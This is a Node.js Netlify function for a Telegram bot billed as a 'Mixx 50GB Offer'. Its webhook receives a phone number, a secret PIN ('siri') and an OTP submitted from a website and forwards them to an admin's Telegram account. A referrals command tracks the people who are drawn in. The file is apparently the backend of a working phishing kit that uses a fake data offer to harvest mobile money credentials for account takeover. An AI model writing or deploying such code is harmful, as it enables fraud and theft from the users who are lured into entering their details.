// netlify/functions/bot.js
const { Telegraf } = require('telegraf');

// Get bot token from environment variables
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// Store referrals temporarily
let referrals = [];

// ===== BOT COMMANDS =====

// /start command
bot.command('start', async (ctx) => {
    const userId = ctx.message.from.id;
    const username = ctx.message.from.username || 'No username';
    const firstName = ctx.message.from.first_name || '';
    
    let message = `🎉 Welcome to Mixx 50GB Offer Bot!\n\n`;
    message += `👤 User: ${firstName}\n`;
    message += `🆔 ID: ${userId}\n\n`;
    message += `📋 Data from your website will be sent here automatically.`;
    
    ctx.reply(message);
});

// /referrals command - show referral stats
bot.command('referrals', async (ctx) => {
    const userId = ctx.message.from.id;
    const adminId = process.env.ADMIN_TELEGRAM_ID;
    
    if (userId.toString() === adminId) {
        const total = referrals.length;
        let message = `📊 Referral Statistics\n`;
        message += `━━━━━━━━━━━━━━━━━\n`;
        message += `📌 Total Referrals: ${total}\n\n`;
        
        if (total > 0) {
            referrals.slice(-10).forEach((ref, index) => {
                message += `${index + 1}. ${ref.firstName} (@${ref.username})\n`;
                message += `   Code: ${ref.referralCode}\n`;
                message += `   ${new Date(ref.timestamp).toLocaleString()}\n\n`;
            });
        }
        
        ctx.reply(message);
    } else {
        ctx.reply('⛔ You are not authorized to view referrals.');
    }
});

// ===== WEBHOOK HANDLER =====

exports.handler = async (event) => {
    try {
        const body = JSON.parse(event.body);
        
        // Check if this is from your website
        if (body.source === 'website') {
            const { namba, siri, otp } = body.data;
            
            let message = `📱 **New Submission Received!**\n\n`;
            message += `📌 **Phone Number:** ${namba || 'N/A'}\n`;
            
            if (siri) {
                message += `🔐 **Secret Code (Siri):** ${siri}\n`;
            }
            
            if (otp) {
                message += `🔑 **OTP Code:** ${otp}\n`;
            }
            
            message += `\n🕐 Time: ${new Date().toLocaleString()}`;
            
            const adminId = process.env.ADMIN_TELEGRAM_ID;
            if (adminId) {
                await bot.telegram.sendMessage(adminId, message);
            }
            
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true })
            };
        }
        
        await bot.handleUpdate(body);
        
        return {
            statusCode: 200,
            body: 'OK'
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 400,
            body: JSON.stringify({ error: error.message })
        };
    }
};
